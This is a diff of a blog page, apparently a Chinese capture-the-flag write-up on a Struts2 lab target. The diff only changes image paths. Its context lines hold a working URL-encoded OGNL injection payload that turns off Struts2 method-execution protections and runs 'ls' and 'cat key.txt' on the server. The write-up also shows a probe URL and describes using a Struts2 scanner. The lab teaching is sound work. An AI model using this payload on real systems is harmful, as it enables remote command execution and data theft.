@@ -399,17 +399,17 @@
 <h1 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h1><h2 id="1、在url后面添加-1-2-action："><a href="#1、在url后面添加-1-2-action：" class="headerlink" title="1、在url后面添加${1+2}.action："></a>1、在url后面添加${1+2}.action：</h2><pre class="line-numbers language-bash"><code class="language-bash">访问http://124.70.71.251:45344/$<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;1+2&amp;#125;.action</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>发现存在回显</p>
-<p>  <img src="/posts/undefined/1.png" class></p>
+<p>  <img src="/posts/d38/1.png" class></p>
 <h2 id="2、发现key-txt，构造："><a href="#2、发现key-txt，构造：" class="headerlink" title="2、发现key.txt，构造："></a>2、发现key.txt，构造：</h2><pre class="line-numbers language-bash"><code class="language-bash">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>  <img src="/posts/undefined/2.png" class></p>
+<p>  <img src="/posts/d38/2.png" class></p>
 <h2 id="3、访问key-txt："><a href="#3、访问key-txt：" class="headerlink" title="3、访问key.txt："></a>3、访问key.txt：</h2><pre class="line-numbers language-bash"><code class="language-bash">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20key.txt%27%29.getInputStream%28%29%29%2C%23q%7D.action
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>  <img src="/posts/undefined/3.png" class></p>
+<p>  <img src="/posts/d38/3.png" class></p>
 <h1 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h1><h2 id="1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index-action）"><a href="#1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index-action）" class="headerlink" title="1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index.action）"></a>1、利用Struts2漏洞检测工具，输入url（我这个工具是要加index.action）</h2><p>可以看到漏洞存在：</p>
-<p>  <img src="/posts/undefined/4.png" class></p>
-<h2 id="2、执行命令ls，看到有一个key-txt"><a href="#2、执行命令ls，看到有一个key-txt" class="headerlink" title="2、执行命令ls，看到有一个key.txt"></a>2、执行命令ls，看到有一个key.txt</h2><p>  <img src="/posts/undefined/5.png" class></p>
-<h2 id="3、使用命令cat-key-txt获取key-txt的内容，得到flag"><a href="#3、使用命令cat-key-txt获取key-txt的内容，得到flag" class="headerlink" title="3、使用命令cat key.txt获取key.txt的内容，得到flag"></a>3、使用命令cat key.txt获取key.txt的内容，得到flag</h2><p>  <img src="/posts/undefined/6.png" class></p>
+<p>  <img src="/posts/d38/4.png" class></p>
+<h2 id="2、执行命令ls，看到有一个key-txt"><a href="#2、执行命令ls，看到有一个key-txt" class="headerlink" title="2、执行命令ls，看到有一个key.txt"></a>2、执行命令ls，看到有一个key.txt</h2><p>  <img src="/posts/d38/5.png" class></p>
+<h2 id="3、使用命令cat-key-txt获取key-txt的内容，得到flag"><a href="#3、使用命令cat-key-txt获取key-txt的内容，得到flag" class="headerlink" title="3、使用命令cat key.txt获取key.txt的内容，得到flag"></a>3、使用命令cat key.txt获取key.txt的内容，得到flag</h2><p>  <img src="/posts/d38/6.png" class></p>
 
                 
             </div>
